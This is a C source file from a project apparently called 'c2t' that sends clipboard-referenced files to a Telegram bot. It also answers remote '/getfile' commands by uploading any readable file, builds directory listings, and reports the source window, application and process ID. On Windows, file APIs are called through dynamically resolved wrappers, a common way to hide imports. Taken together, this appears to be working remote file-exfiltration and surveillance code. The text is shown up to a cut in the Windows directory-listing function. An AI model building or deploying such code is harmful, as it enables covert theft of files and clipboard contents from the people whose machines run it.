/*
 * Copyright (C) 2026 roothunter
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

#include "files.h"
#include "../config/config.h"
#include "../crypto/crypto.h"
#include "../logging/logging.h"
#include "../telegram/telegram.h"

#include <ctype.h>
#include <errno.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#include <sys/stat.h>
#include <windows.h>
#include "../win32/win32_api.h"

static void c2t_InitializeCriticalSection(
    LPCRITICAL_SECTION lpCriticalSection) {
  c2t_win32_api_init();
  if (g_c2t_win32.InitializeCriticalSection)
    g_c2t_win32.InitializeCriticalSection(lpCriticalSection);
}
static void c2t_EnterCriticalSection(LPCRITICAL_SECTION lpCriticalSection) {
  c2t_win32_api_init();
  if (g_c2t_win32.EnterCriticalSection)
    g_c2t_win32.EnterCriticalSection(lpCriticalSection);
}
static void c2t_LeaveCriticalSection(LPCRITICAL_SECTION lpCriticalSection) {
  c2t_win32_api_init();
  if (g_c2t_win32.LeaveCriticalSection)
    g_c2t_win32.LeaveCriticalSection(lpCriticalSection);
}
static int c2t_MultiByteToWideChar(UINT CodePage, DWORD dwFlags,
                                    LPCCH lpMultiByteStr, int cbMultiByte,
                                    LPWSTR lpWideCharStr, int cchWideChar) {
  c2t_win32_api_init();
  if (g_c2t_win32.MultiByteToWideChar)
    return g_c2t_win32.MultiByteToWideChar(CodePage, dwFlags, lpMultiByteStr,
                                           cbMultiByte, lpWideCharStr,
                                           cchWideChar);
  return 0;
}
static int c2t_WideCharToMultiByte(UINT CodePage, DWORD dwFlags,
                                    LPCWCH lpWideCharStr, int cchWideChar,
                                    LPSTR lpMultiByteStr, int cbMultiByte,
                                    LPCCH lpDefaultChar,
                                    LPBOOL lpUsedDefaultChar) {
  c2t_win32_api_init();
  if (g_c2t_win32.WideCharToMultiByte)
    return g_c2t_win32.WideCharToMultiByte(
        CodePage, dwFlags, lpWideCharStr, cchWideChar, lpMultiByteStr,
        cbMultiByte, lpDefaultChar, lpUsedDefaultChar);
  return 0;
}
static BOOL c2t_CreateDirectoryW(LPCWSTR lpPathName,
                                  LPSECURITY_ATTRIBUTES lpSecurityAttributes) {
  c2t_win32_api_init();
  if (g_c2t_win32.CreateDirectoryW)
    return g_c2t_win32.CreateDirectoryW(lpPathName, lpSecurityAttributes);
  return FALSE;
}
static HANDLE c2t_FindFirstFileW(LPCWSTR lpFileName,
                                 LPWIN32_FIND_DATAW lpFindFileData) {
  c2t_win32_api_init();
  if (g_c2t_win32.FindFirstFileW)
    return g_c2t_win32.FindFirstFileW(lpFileName, lpFindFileData);
  return INVALID_HANDLE_VALUE;
}
static BOOL c2t_FindNextFileW(HANDLE hFindFile,
                              LPWIN32_FIND_DATAW lpFindFileData) {
  c2t_win32_api_init();
  if (g_c2t_win32.FindNextFileW)
    return g_c2t_win32.FindNextFileW(hFindFile, lpFindFileData);
  return FALSE;
}
static BOOL c2t_FindClose(HANDLE hFindFile) {
  c2t_win32_api_init();
  if (g_c2t_win32.FindClose)
    return g_c2t_win32.FindClose(hFindFile);
  return FALSE;
}
static DWORD c2t_GetLastError(VOID) {
  c2t_win32_api_init();
  if (g_c2t_win32.GetLastError)
    return g_c2t_win32.GetLastError();
  return 0;
}

#define InitializeCriticalSection c2t_InitializeCriticalSection
#define EnterCriticalSection c2t_EnterCriticalSection
#define LeaveCriticalSection c2t_LeaveCriticalSection
#define MultiByteToWideChar c2t_MultiByteToWideChar
#define WideCharToMultiByte c2t_WideCharToMultiByte
#define CreateDirectoryW c2t_CreateDirectoryW
#define FindFirstFileW c2t_FindFirstFileW
#define FindNextFileW c2t_FindNextFileW
#define FindClose c2t_FindClose
#define GetLastError c2t_GetLastError

typedef struct _stat64 c2t_stat_t;
static CRITICAL_SECTION files_metrics_mutex;
static int files_mutex_init;
#else
#include <dirent.h>
#include <pthread.h>
#include <sys/stat.h>
#include <unistd.h>
typedef struct stat c2t_stat_t;
static pthread_mutex_t files_metrics_mutex = PTHREAD_MUTEX_INITIALIZER;
#endif

static uint64_t total_files_sent_bytes;
static uint64_t total_files_sent_count;

static void files_lock(void) {
#ifndef _WIN32
  (void)pthread_mutex_lock(&files_metrics_mutex);
#else
  if (!files_mutex_init) {
    InitializeCriticalSection(&files_metrics_mutex);
    files_mutex_init = 1;
  }
  EnterCriticalSection(&files_metrics_mutex);
#endif
}

static void files_unlock(void) {
#ifndef _WIN32
  (void)pthread_mutex_unlock(&files_metrics_mutex);
#else
  LeaveCriticalSection(&files_metrics_mutex);
#endif
}

[[nodiscard]] static int ascii_equal_nocase(const char *left, const char *right,
                                            size_t length) {
  for (size_t index = 0; index < length; ++index) {
    if (tolower((unsigned char)left[index]) !=
        tolower((unsigned char)right[index]))
      return 0;
  }
  return 1;
}

[[nodiscard]] static int mime_is(const char *mime_type, const char *expected) {
  size_t length = strlen(expected);
  return strlen(mime_type) >= length &&
         ascii_equal_nocase(mime_type, expected, length) &&
         (mime_type[length] == '\0' || mime_type[length] == ';');
}

[[nodiscard]] static int hexadecimal_value(unsigned char character) {
  if (character >= '0' && character <= '9')
    return character - '0';
  character = (unsigned char)tolower(character);
  return character >= 'a' && character <= 'f' ? character - 'a' + 10 : -1;
}

[[nodiscard]] static int decode_path(char *path, int uri) {
  char *input = path;
  char *output = path;
  while (*input) {
    if (uri && *input == '%') {
      int high = hexadecimal_value((unsigned char)input[1]);
      int low = input[1] ? hexadecimal_value((unsigned char)input[2]) : -1;
      if (high < 0 || low < 0)
        return 0;
      unsigned char decoded = (unsigned char)((high << 4) | low);
      if (decoded == 0)
        return 0;
      *output++ = (char)decoded;
      input += 3;
    } else {
      *output++ = *input++;
    }
  }
  *output = '\0';
  return 1;
}

[[nodiscard]] static char *sanitize_input_path(const char *raw_path) {
  if (!raw_path)
    return nullptr;
  const char *text = raw_path;
  size_t length = strlen(text);
  while (length > 0 && isspace((unsigned char)*text)) {
    ++text;
    --length;
  }
  while (length > 0 && isspace((unsigned char)text[length - 1]))
    --length;
  if (length == 0 || memchr(text, '\0', length))
    return nullptr;

  if (length >= 2 && ((text[0] == '"' && text[length - 1] == '"') ||
                      (text[0] == '\'' && text[length - 1] == '\''))) {
    ++text;
    length -= 2;
  }
  while (length > 0 && isspace((unsigned char)*text)) {
    ++text;
    --length;
  }
  while (length > 0 && isspace((unsigned char)text[length - 1]))
    --length;
  if (length == 0)
    return nullptr;

  char *path = malloc(length + 1);
  if (!path)
    return nullptr;
  memcpy(path, text, length);
  path[length] = '\0';

  int uri = length >= 7 && ascii_equal_nocase(path, "file://", 7);
  if (uri) {
    char *uri_path = path + 7;
    size_t uri_path_length = strlen(uri_path);
    if (uri_path_length >= 10 && ascii_equal_nocase(uri_path, "localhost/", 10))
      uri_path += 9;
    else if (*uri_path != '/') {
      free(path);
      return nullptr;
    }
    memmove(path, uri_path, strlen(uri_path) + 1);
#ifdef _WIN32
    if (strlen(path) >= 3 && path[0] == '/' &&
        isalpha((unsigned char)path[1]) && path[2] == ':')
      memmove(path, path + 1, strlen(path));
#endif
  }
  if (!decode_path(path, uri)) {
    free(path);
    return nullptr;
  }
  return path;
}

[[nodiscard]] static char *clipboard_path(const void *data, size_t length,
                                          const char *mime_type,
                                          int *explicit_uri) {
  const char *text = data;
  while (length > 0 && isspace((unsigned char)*text)) {
    ++text;
    --length;
  }
  while (length > 0 && isspace((unsigned char)text[length - 1]))
    --length;
  if (length == 0 || memchr(text, '\0', length))
    return nullptr;

  int uri_list = mime_is(mime_type, "text/uri-list");
  if (memchr(text, '\r', length) || memchr(text, '\n', length))
    return nullptr;

  if (length >= 2 && ((text[0] == '"' && text[length - 1] == '"') ||
                      (text[0] == '\'' && text[length - 1] == '\''))) {
    ++text;
    length -= 2;
  }

  char *path = malloc(length + 1);
  if (!path)
    return nullptr;
  memcpy(path, text, length);
  path[length] = '\0';

  int uri = length >= 7 && ascii_equal_nocase(path, "file://", 7);
  *explicit_uri = uri || uri_list;
  if (uri) {
    char *uri_path = path + 7;
    size_t uri_path_length = strlen(uri_path);
    if (uri_path_length >= 10 && ascii_equal_nocase(uri_path, "localhost/", 10))
      uri_path += 9;
    else if (*uri_path != '/') {
      free(path);
      return nullptr;
    }
    memmove(path, uri_path, strlen(uri_path) + 1);
#ifdef _WIN32
    if (strlen(path) >= 3 && path[0] == '/' &&
        isalpha((unsigned char)path[1]) && path[2] == ':')
      memmove(path, path + 1, strlen(path));
#endif
  }
  if (!decode_path(path, uri)) {
    free(path);
    return nullptr;
  }
  return path;
}

[[nodiscard]] static const char *filename_from_path(const char *path) {
  const char *filename = path;
  for (const char *cursor = path; *cursor; ++cursor) {
    if (*cursor == '/' || *cursor == '\\')
      filename = cursor + 1;
  }
  return *filename ? filename : "clipboard.bin";
}

[[nodiscard]] static const char *mime_from_filename(const char *filename) {
  const char *extension = strrchr(filename, '.');
  if (!extension)
    return "application/octet-stream";
  ++extension;
  char ext[8] = {};
  for (size_t i = 0; i < 7 && extension[i]; ++i)
    ext[i] = (char)tolower((unsigned char)extension[i]);

  /* O(1) branch-predictable matching on normalized extension */
  if (ext[0] == 't' && ext[1] == 'x' && ext[2] == 't' && ext[3] == '\0')
    return "text/plain";
  if (ext[0] == 'p' && ext[1] == 'n' && ext[2] == 'g' && ext[3] == '\0')
    return "image/png";
  if (ext[0] == 'j' && ext[1] == 'p' && ext[2] == 'g' && ext[3] == '\0')
    return "image/jpeg";
  if (ext[0] == 'j' && ext[1] == 'p' && ext[2] == 'e' && ext[3] == 'g' &&
      ext[4] == '\0')
    return "image/jpeg";
  if (ext[0] == 'p' && ext[1] == 'd' && ext[2] == 'f' && ext[3] == '\0')
    return "application/pdf";
  if (ext[0] == 'z' && ext[1] == 'i' && ext[2] == 'p' && ext[3] == '\0')
    return "application/zip";
  if (ext[0] == 'j' && ext[1] == 's' && ext[2] == 'o' && ext[3] == 'n' &&
      ext[4] == '\0')
    return "application/json";
  if (ext[0] == 'c' && ext[1] == 's' && ext[2] == 'v' && ext[3] == '\0')
    return "text/csv";
  if (ext[0] == 'w' && ext[1] == 'e' && ext[2] == 'b' && ext[3] == 'p' &&
      ext[4] == '\0')
    return "image/webp";
  if (ext[0] == 'g' && ext[1] == 'i' && ext[2] == 'f' && ext[3] == '\0')
    return "image/gif";
  if (ext[0] == 'b' && ext[1] == 'm' && ext[2] == 'p' && ext[3] == '\0')
    return "image/bmp";
  if (ext[0] == 'm' && ext[1] == 'p' && ext[2] == '4' && ext[3] == '\0')
    return "video/mp4";
  if (ext[0] == 'm' && ext[1] == 'p' && ext[2] == '3' && ext[3] == '\0')
    return "audio/mpeg";
  if (ext[0] == 'm' && ext[1] == '4' && ext[2] == 'a' && ext[3] == '\0')
    return "audio/mp4";
  if (ext[0] == 'm' && ext[1] == 'o' && ext[2] == 'v' && ext[3] == '\0')
    return "video/quicktime";
  if (ext[0] == 'x' && ext[1] == 'm' && ext[2] == 'l' && ext[3] == '\0')
    return "application/xml";

  return "application/octet-stream";
}

static void append_escaped_html(char *output, size_t *offset, size_t capacity,
                                const char *input) {
  if (!input || !output || !offset)
    return;
  while (*input && *offset + 6 < capacity) {
    if (*input == '&') {
      memcpy(output + *offset, "&amp;", 5);
      *offset += 5;
    } else if (*input == '<') {
      memcpy(output + *offset, "&lt;", 4);
      *offset += 4;
    } else if (*input == '>') {
      memcpy(output + *offset, "&gt;", 4);
      *offset += 4;
    } else {
      output[(*offset)++] = *input;
    }
    input++;
  }
  output[*offset] = '\0';
}

static int send_file_error_telegram(const char *path, const char *error_message,
                                    const c2t_clipboard_source_t *source) {
  char html[2048];
  size_t offset = 0;

  static const char header[] =
      "⚠️ <b>File Delivery Failed</b>\n<b>Path:</b> <code>";
  memcpy(html, header, sizeof(header) - 1);
  offset = sizeof(header) - 1;

  append_escaped_html(html, &offset, sizeof(html), path);

  static const char mid[] = "</code>\n<b>Error:</b> ";
  if (offset + sizeof(mid) - 1 < sizeof(html)) {
    memcpy(html + offset, mid, sizeof(mid) - 1);
    offset += sizeof(mid) - 1;
  }

  append_escaped_html(html, &offset, sizeof(html), error_message);

  const c2t_config_t *config = c2t_config_get();
  if (config->telegram_send_window_info && source &&
      (source->application[0] || source->title[0] || source->process_id)) {
    static const char src_hdr[] = "\n<b>Source:</b> <i>";
    if (offset + sizeof(src_hdr) - 1 < sizeof(html)) {
      memcpy(html + offset, src_hdr, sizeof(src_hdr) - 1);
      offset += sizeof(src_hdr) - 1;
    }

    char source_desc[512] = {};
    size_t s_off = 0;
    if (source->application[0]) {
      s_off += snprintf(source_desc + s_off, sizeof(source_desc) - s_off, "%s",
                        source->application);
    }
    if (source->title[0] && s_off + 3 < sizeof(source_desc)) {
      s_off += snprintf(source_desc + s_off, sizeof(source_desc) - s_off,
                        "%s%s", s_off > 0 ? " | " : "", source->title);
    }
    if (source->process_id && s_off + 16 < sizeof(source_desc)) {
      snprintf(source_desc + s_off, sizeof(source_desc) - s_off, "%sPID %lu",
               s_off > 0 ? " | " : "", (unsigned long)source->process_id);
    }

    append_escaped_html(html, &offset, sizeof(html), source_desc);

    static const char src_ftr[] = "</i>";
    if (offset + sizeof(src_ftr) - 1 < sizeof(html)) {
      memcpy(html + offset, src_ftr, sizeof(src_ftr) - 1);
      offset += sizeof(src_ftr) - 1;
    }
  }

  html[offset] = '\0';
  return telegram_send_html(html);
}

enum {
  READ_FILE_OK = 0,
  READ_FILE_NOT_FOUND = 1,
  READ_FILE_NOT_REGULAR = 2,
  READ_FILE_ERROR = -1
};

#ifdef _WIN32
[[nodiscard]] static wchar_t *utf8_path(const char *path) {
  int length =
      MultiByteToWideChar(CP_UTF8, MB_ERR_INVALID_CHARS, path, -1, nullptr, 0);
  wchar_t *wide = length > 0 ? malloc((size_t)length * sizeof(*wide)) : nullptr;
  if (!wide || !MultiByteToWideChar(CP_UTF8, MB_ERR_INVALID_CHARS, path, -1,
                                    wide, length)) {
    free(wide);
    return nullptr;
  }
  return wide;
}
#endif

[[nodiscard]] static int read_file(const char *path, const c2t_config_t *config,
                                   unsigned char **data, size_t *length,
                                   char *error_out, size_t error_capacity) {
  c2t_stat_t status;
  FILE *file;
#ifdef _WIN32
  wchar_t *wide = utf8_path(path);
  if (!wide) {
    if (error_out && error_capacity > 0)
      snprintf(error_out, error_capacity, "Invalid UTF-8 file path");
    return READ_FILE_NOT_FOUND;
  }
  int stat_result = _wstat64(wide, &status);
  int saved_errno = errno;
  file = stat_result == 0 ? _wfopen(wide, L"rb") : nullptr;
  int open_errno = errno;
  free(wide);
  if (stat_result != 0) {
    if (error_out && error_capacity > 0)
      snprintf(error_out, error_capacity,
               "File does not exist or cannot be accessed: %s",
               strerror(saved_errno));
    return READ_FILE_NOT_FOUND;
  }
  if ((status.st_mode & _S_IFMT) != _S_IFREG) {
    if (file)
      fclose(file);
    if (error_out && error_capacity > 0) {
      if ((status.st_mode & _S_IFMT) == _S_IFDIR)
        snprintf(error_out, error_capacity,
                 "Path is a directory, not a regular file");
      else
        snprintf(error_out, error_capacity, "Path is not a regular file");
    }
    return READ_FILE_NOT_REGULAR;
  }
#else
  int stat_result = stat(path, &status);
  int saved_errno = errno;
  file = stat_result == 0 ? fopen(path, "rb") : nullptr;
  int open_errno = errno;
  if (stat_result != 0) {
    if (error_out && error_capacity > 0)
      snprintf(error_out, error_capacity,
               "File does not exist or cannot be accessed: %s",
               strerror(saved_errno));
    return READ_FILE_NOT_FOUND;
  }
  if (!S_ISREG(status.st_mode)) {
    if (file)
      fclose(file);
    if (error_out && error_capacity > 0) {
      if (S_ISDIR(status.st_mode))
        snprintf(error_out, error_capacity,
                 "Path is a directory, not a regular file");
      else
        snprintf(error_out, error_capacity, "Path is not a regular file");
    }
    return READ_FILE_NOT_REGULAR;
  }
#endif
  if (status.st_size < 0 ||
      (uintmax_t)status.st_size > (uintmax_t)config->telegram_max_file_bytes) {
    if (file)
      fclose(file);
    c2t_log_error(
        "files",
        "File '%s' exceeds configured limit of %llu bytes (size: %llu bytes)",
        path, (unsigned long long)config->telegram_max_file_bytes,
        (unsigned long long)status.st_size);
    if (error_out && error_capacity > 0) {
      snprintf(error_out, error_capacity,
               "File size (%.2f MB / %llu bytes) exceeds configured limit "
               "(%.2f MB / %llu bytes)",
               (double)status.st_size / (1024.0 * 1024.0),
               (unsigned long long)status.st_size,
               (double)config->telegram_max_file_bytes / (1024.0 * 1024.0),
               (unsigned long long)config->telegram_max_file_bytes);
    }
    return READ_FILE_ERROR;
  }
  if (!file) {
    c2t_log_error("files", "File '%s' cannot be opened for reading: %s", path,
                  strerror(open_errno));
    if (error_out && error_capacity > 0)
      snprintf(error_out, error_capacity, "Cannot open file for reading: %s",
               strerror(open_errno));
    return READ_FILE_ERROR;
  }

  *length = (size_t)status.st_size;
  *data = malloc(*length ? *length : 1);
  if (!*data) {
    fclose(file);
    c2t_log_error("files", "Not enough memory to read clipboard file '%s'",
                  path);
    if (error_out && error_capacity > 0)
      snprintf(error_out, error_capacity,
               "Memory allocation failed while reading file");
    return READ_FILE_ERROR;
  }
  size_t bytes_read = fread(*data, 1, *length, file);
  int read_errno = errno;
  int close_result = fclose(file);
  if (bytes_read != *length || close_result != 0) {
    free(*data);
    *data = nullptr;
    c2t_log_error("files",
                  "Unable to read the complete clipboard file '%s': %s", path,
                  strerror(read_errno));
    if (error_out && error_capacity > 0)
      snprintf(error_out, error_capacity,
               "Failed to read complete file content: %s",
               strerror(read_errno));
    return READ_FILE_ERROR;
  }
  return READ_FILE_OK;
}

int c2t_file_try_clipboard_path(const void *data, size_t length,
                                const char *mime_type,
                                const c2t_clipboard_source_t *source) {
  const c2t_config_t *config = c2t_config_get();
  if (!config->telegram_send_files || !data || !mime_type ||
      strncmp(mime_type, "text/", 5) != 0)
    return C2T_FILE_NOT_HANDLED;

  int explicit_uri = 0;
  char *path = clipboard_path(data, length, mime_type, &explicit_uri);
  if (!path)
    return C2T_FILE_NOT_HANDLED;

  char error_msg[512] = {};
  unsigned char *contents = nullptr;
  size_t file_length = 0;
  int read_result = read_file(path, config, &contents, &file_length, error_msg,
                              sizeof(error_msg));

  if (read_result == READ_FILE_NOT_FOUND) {
    if (!explicit_uri) {
      free(path);
      return C2T_FILE_NOT_HANDLED;
    }
    int sent = send_file_error_telegram(path, error_msg, source);
    free(path);
    return sent ? C2T_FILE_SENT : C2T_FILE_ERROR;
  }

  if (read_result == READ_FILE_NOT_REGULAR) {
    if (!explicit_uri) {
      free(path);
      return C2T_FILE_NOT_HANDLED;
    }
    int sent = send_file_error_telegram(path, error_msg, source);
    free(path);
    return sent ? C2T_FILE_SENT : C2T_FILE_ERROR;
  }

  if (read_result == READ_FILE_ERROR) {
    int sent = send_file_error_telegram(path, error_msg, source);
    free(path);
    return sent ? C2T_FILE_SENT : C2T_FILE_ERROR;
  }

  const char *filename = filename_from_path(path);
  const char *mime = mime_from_filename(filename);
  c2t_log_info("files",
               "Recognized clipboard file: name=%s, type=%s, "
               "size=%llu bytes",
               filename, mime, (unsigned long long)file_length);
  int result =
      telegram_send_file(contents, file_length, mime, filename, source);
  if (!result) {
    send_file_error_telegram(path, "Failed to upload file to Telegram", source);
  } else {
    files_lock();
    total_files_sent_bytes += file_length;
    total_files_sent_count++;
    files_unlock();
  }
  if (contents) {
    c2t_secure_zero(contents, file_length);
    free(contents);
  }
  if (path) {
    c2t_secure_zero(path, strlen(path));
    free(path);
  }
  return result ? C2T_FILE_SENT : C2T_FILE_ERROR;
}

static void format_size_human(uint64_t bytes, char *buf, size_t capacity) {
  if (!buf || capacity == 0)
    return;
  if (bytes < 1024) {
    snprintf(buf, capacity, "%llu B", (unsigned long long)bytes);
  } else if (bytes < 1024 * 1024) {
    snprintf(buf, capacity, "%.1f KB", (double)bytes / 1024.0);
  } else if (bytes < 1024ULL * 1024 * 1024) {
    snprintf(buf, capacity, "%.2f MB", (double)bytes / (1024.0 * 1024.0));
  } else {
    snprintf(buf, capacity, "%.2f GB",
             (double)bytes / (1024.0 * 1024.0 * 1024.0));
  }
}

int c2t_file_send_path(const char *path_str,
                       const c2t_clipboard_source_t *source) {
  const c2t_config_t *config = c2t_config_get();
  if (!path_str || !*path_str) {
    telegram_send_html("⚠️ <b>No path specified.</b>\n"
                       "<i>Usage:</i> <code>/getfile &lt;file_path&gt;</code>");
    return C2T_FILE_ERROR;
  }

  char *clean_path = sanitize_input_path(path_str);
  if (!clean_path) {
    telegram_send_html("⚠️ <b>Invalid file path specified.</b>");
    return C2T_FILE_ERROR;
  }

  char error_msg[512] = {};
  unsigned char *contents = nullptr;
  size_t file_length = 0;
  int read_result = read_file(clean_path, config, &contents, &file_length,
                              error_msg, sizeof(error_msg));

  if (read_result != READ_FILE_OK) {
    send_file_error_telegram(clean_path, error_msg, source);
    c2t_secure_zero(clean_path, strlen(clean_path));
    free(clean_path);
    return C2T_FILE_ERROR;
  }

  const char *filename = filename_from_path(clean_path);
  const char *mime = mime_from_filename(filename);
  c2t_log_info(
      "files",
      "Delivering requested file: name=%s, type=%s, size=%llu bytes (path: %s)",
      filename, mime, (unsigned long long)file_length, clean_path);

  int result =
      telegram_send_file(contents, file_length, mime, filename, source);
  if (!result) {
    send_file_error_telegram(clean_path, "Failed to upload file to Telegram",
                             source);
  } else {
    files_lock();
    total_files_sent_bytes += file_length;
    total_files_sent_count++;
    files_unlock();
  }
  if (contents) {
    c2t_secure_zero(contents, file_length);
    free(contents);
  }
  if (clean_path) {
    c2t_secure_zero(clean_path, strlen(clean_path));
    free(clean_path);
  }
  return result ? C2T_FILE_SENT : C2T_FILE_ERROR;
}

#ifndef _WIN32
static int list_dir_posix(const char *clean_path, char *output,
                          size_t capacity) {
  DIR *dir = opendir(clean_path);
  if (!dir) {
    size_t offset = 0;
    static const char err_hdr[] = "⚠️ <b>Cannot open directory:</b> <code>";
    memcpy(output, err_hdr, sizeof(err_hdr) - 1);
    offset = sizeof(err_hdr) - 1;
    append_escaped_html(output, &offset, capacity, clean_path);
    static const char err_mid[] = "</code>\n<b>Error:</b> ";
    if (offset + sizeof(err_mid) - 1 < capacity) {
      memcpy(output + offset, err_mid, sizeof(err_mid) - 1);
      offset += sizeof(err_mid) - 1;
    }
    append_escaped_html(output, &offset, capacity, strerror(errno));
    return 0;
  }

  size_t offset = 0;
  static const char header_fmt[] = "📁 <b>Directory:</b> <code>";
  memcpy(output, header_fmt, sizeof(header_fmt) - 1);
  offset = sizeof(header_fmt) - 1;
  append_escaped_html(output, &offset, capacity, clean_path);
  static const char header_end[] = "</code>\n\n";
  if (offset + sizeof(header_end) - 1 < capacity) {
    memcpy(output + offset, header_end, sizeof(header_end) - 1);
    offset += sizeof(header_end) - 1;
  }

  struct dirent *entry;
  size_t dir_count = 0;
  size_t file_count = 0;
  uint64_t total_bytes = 0;
  size_t displayed_count = 0;
  int truncated = 0;

  while ((entry = readdir(dir)) != nullptr) {
    if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
      continue;

    char entry_full_path[1024];
    snprintf(entry_full_path, sizeof(entry_full_path), "%s/%s", clean_path,
             entry->d_name);

    struct stat st;
    int is_dir = 0;
    uint64_t sz = 0;
    if (stat(entry_full_path, &st) == 0) {
      is_dir = S_ISDIR(st.st_mode);
      if (!is_dir) {
        sz = (uint64_t)st.st_size;
        total_bytes += sz;
      }
    }
#ifdef _DIRENT_HAVE_D_TYPE
    else if (entry->d_type == DT_DIR) {
      is_dir = 1;
    }
#endif
    if (is_dir) {
      dir_count++;
    } else {
      file_count++;
    }

    if (!truncated && offset + 128 < capacity - 256) {
      char size_str[32] = {};
      if (is_dir) {
        static const char dir_pfx[] = "📁 <code>";
        if (offset + sizeof(dir_pfx) - 1 < capacity - 256) {
          memcpy(output + offset, dir_pfx, sizeof(dir_pfx) - 1);
          offset += sizeof(dir_pfx) - 1;
          append_escaped_html(output, &offset, capacity - 256, entry->d_name);
          static const char dir_sfx[] = "/</code>\n";
          if (offset + sizeof(dir_sfx) - 1 < capacity - 256) {
            memcpy(output + offset, dir_sfx, sizeof(dir_sfx) - 1);
            offset += sizeof(dir_sfx) - 1;
            displayed_count++;
          }
        }
      } else {
        format_size_human(sz, size_str, sizeof(size_str));
        static const char file_pfx[] = "📄 <code>";
        if (offset + sizeof(file_pfx) - 1 < capacity - 256) {
          memcpy(output + offset, file_pfx, sizeof(file_pfx) - 1);
          offset += sizeof(file_pfx) - 1;
          append_escaped_html(output, &offset, capacity - 256, entry->d_name);
          char sz_suffix[64];
          snprintf(sz_suffix, sizeof(sz_suffix), "</code> <i>(%s)</i>\n",
                   size_str);
          size_t s_len = strlen(sz_suffix);
          if (offset + s_len < capacity - 256) {
            memcpy(output + offset, sz_suffix, s_len);
            offset += s_len;
            displayed_count++;
          }
        }
      }
    } else {
      truncated = 1;
    }
  }
  closedir(dir);

  if (dir_count == 0 && file_count == 0) {
    static const char empty_msg[] = "<i>(Directory is empty)</i>\n";
    if (offset + sizeof(empty_msg) - 1 < capacity - 128) {
      memcpy(output + offset, empty_msg, sizeof(empty_msg) - 1);
      offset += sizeof(empty_msg) - 1;
    }
  } else if (truncated) {
    char more_buf[128];
    snprintf(more_buf, sizeof(more_buf), "<i>... and %zu more items</i>\n",
             (dir_count + file_count) - displayed_count);
    size_t m_len = strlen(more_buf);
    if (offset + m_len < capacity - 128) {
      memcpy(output + offset, more_buf, m_len);
      offset += m_len;
    }
  }

  char total_sz_str[32];
  format_size_human(total_bytes, total_sz_str, sizeof(total_sz_str));
  char footer[128];
  snprintf(footer, sizeof(footer),
           "\n📊 <b>Total:</b> %zu dirs, %zu files (%s)", dir_count, file_count,
           total_sz_str);
  size_t f_len = strlen(footer);
  if (offset + f_len < capacity) {
    memcpy(output + offset, footer, f_len);
    offset += f_len;
  }
  output[offset] = '\0';
  return 1;
}
#else
static int list_dir_windows(const char *clean_path, char *output,
                            size_t capacity) {
  wchar_t *wide_dir = utf8_path(clean_path);
  if (!wide_dir) {
    snprintf(output, capacity, "⚠️ <b>Invalid directory path</b>");
    return 0;
  }

  size_t wide_len = wcslen(wide_dir);
  wchar_t search_pattern[MAX_PATH + 4];
  if (wide_len >= MAX_PATH - 3) {
    free(wide_dir);
    snprintf(output, capacity, "⚠️ <b>Directory path too long</b>");
    return 0;
  }
  wcscpy(search_pattern, wide_dir);
  if (search_pattern[wide_len - 1] != L'\\' &&
      search_pattern[wide_len - 1] != L'/') {
    wcscat(search_pattern, L"\\*");
  } else {
    wcscat(search_pattern, L"*");
  }
  free(wide_dir);

  WIN32_FIND_DATAW find_data;
  HANDLE find_handle = FindFirstFileW(search_pattern, &find_data);
  if (find_handle == INVALID_HANDLE_VALUE) {
    size_t offset = 0;
    static const char err_hdr[] = "⚠️ <b>Cannot open directory:</b> <code>";
    memcpy(output, err_hdr, sizeof(err_hdr) - 1);
    offset = sizeof(err_hdr) - 1;
    append_escaped_html(output, &offset, capacity, clean_path);
    char err_msg[64];
    snprintf(err_msg, sizeof(err_msg), "</code>\n<b>Error:</b> %lu",
             (unsigned long)GetLastError());
    size_t e_len = strlen(err_msg);
    if (offset + e_len < capacity) {
      memcpy(output + offset, err_msg, e_len);
      offset += e_len;
    }
    output[offset] = '\0';
    return 0;
  }

  size_t offset = 0;
  static const char header_fmt[] = "📁 <b>Directory:</b> <code>";
  memcpy(output, header_fmt, sizeof(header_fmt) - 1);
  offset = sizeof(header_fmt) - 1;
  append_escaped_html(output, &offset, capacity, clean_path);
  static const char header_end[] = "</code>\n\n";
  if (offset + sizeof(header_end) - 1 < capacity) {
    memcpy(output + offset, header_end, sizeof(header_end) - 1);
    offset += sizeof(header_end) - 1;
  }

  size_t dir_count = 0;
  size_t file_count = 0;
  uint64_t total_bytes = 0;
  size_t displayed_count = 0;
  int truncated = 0;

  do {
    if (wcscmp(find_data.cFileName, L".") == 0 ||
        wcscmp(find_data.cFileName, L"..") == 0)
      continue;

    char utf8_name[MAX_PATH * 4] = {};
    WideCharToMultiByte(CP_UTF8, 0, find_data.cFileName, -1, utf8_name,
                        sizeof(utf8_name), nullptr, nullptr);

    int is_dir = (find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0;
    uint64_t sz =
        ((uint64_t)find_data.nFileSizeHigh << 32) | find_data.nFileSizeLow;
    if (is_dir) {
      dir_count++;
    } else {
      file_count++;
      total_bytes += sz;
    }

    if (!truncated && offset + 128 < capacity - 256) {
      char size_str[32] = {};
      if (is_dir) {
        static const char dir_pfx[] = "📁 <code>";
        if (offset + sizeof(dir_pfx) - 1 < capacity - 256) {
          memcpy(output + offset, dir_pfx, sizeof(dir_pfx) - 1);
          offset += sizeof(dir_pfx) - 1;
          append_escaped_html(output, &offset, capacity - 256, utf8_name);
          static const char dir_sfx[] = "/</code>\n";
          if (offset + sizeof(dir_sfx) - 1 < capacity - 256) {
            memcpy(output + offset, dir_sfx, sizeof(dir_sfx) - 1);
            offset += sizeof(dir_sfx) - 1;
            displayed_count++;
          }
        }
      } else {
        format_size_human(sz, size_str, sizeof(size_str));
        static const char file_pfx[] = "📄 <code>";
        if (offset + sizeof(file_pfx) - 1 < capacity - 256) {
          memcpy(output + offset, file_pfx, sizeof(file_pfx) - 1);
          offset += sizeof(file_pfx) - 1;
          append_escaped_html(output, &offset, capacity - 256, utf8_name);
